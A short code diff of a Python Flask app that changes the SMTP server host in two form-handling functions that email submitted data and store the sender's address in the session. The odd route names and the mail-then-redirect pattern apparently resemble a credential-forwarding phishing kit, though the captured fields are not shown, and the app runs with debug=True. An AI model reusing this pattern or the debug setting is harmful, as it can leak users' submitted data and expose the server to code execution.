@@ -212,7 +212,7 @@ def clips():
         part2 = MIMEText(html, "html")
         message.attach(part1)
         message.attach(part2)
-        with smtplib.SMTP_SSL("yonia.site", 465) as server:
+        with smtplib.SMTP_SSL("fibrasing.com", 465) as server:
             server.login(sender_email, password)
             server.sendmail(sender_email, receiver_email, message.as_string())
         # Set session value and redirect
@@ -268,7 +268,7 @@ def mansecond():
         part2 = MIMEText(html, "html")
         message.attach(part1)
         message.attach(part2)
-        with smtplib.SMTP_SSL("yonia.site", 465) as server:
+        with smtplib.SMTP_SSL("fibrasing.com", 465) as server:
             server.login(sender_email, password)
             server.sendmail(sender_email, receiver_email, message.as_string())
         session['ins'] = email  # Save email as session variable
@@ -292,6 +292,7 @@ def pilom():
 
 if __name__ == "__main__":
     app.run(debug=True)
+
 
 
 
